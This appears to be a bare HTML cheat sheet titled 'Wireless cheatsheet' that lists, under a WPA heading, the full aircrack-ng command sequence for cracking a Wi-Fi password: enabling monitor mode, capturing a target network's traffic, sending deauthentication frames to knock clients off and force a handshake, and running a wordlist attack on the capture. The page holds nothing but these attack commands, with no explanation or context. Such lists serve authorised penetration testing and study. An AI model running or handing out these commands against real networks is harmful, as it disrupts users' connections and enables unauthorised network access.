<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Wireless cheatsheet</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="css/style.css" />
    <script src="main.js"></script>
</head>
<body>
    <h1>WPA</h1>
    <p>airmon-ng check kill</p>
    <p>airmon-ng start [wlan0]</p>
    <p>airodump-ng [wlan0mon]</p>
    <p>airodump-ng --channel [channel] --bssid [bssid] --write [file] [wlan0mon]</p>
    <p>aireplay-ng --deauth 5 -a [bssid] [wlan0mon]</p>
    <p>aircrack-ng -a2 -b [bssid] -w [wordlist] [path.cap]</p>
</body>
</html>
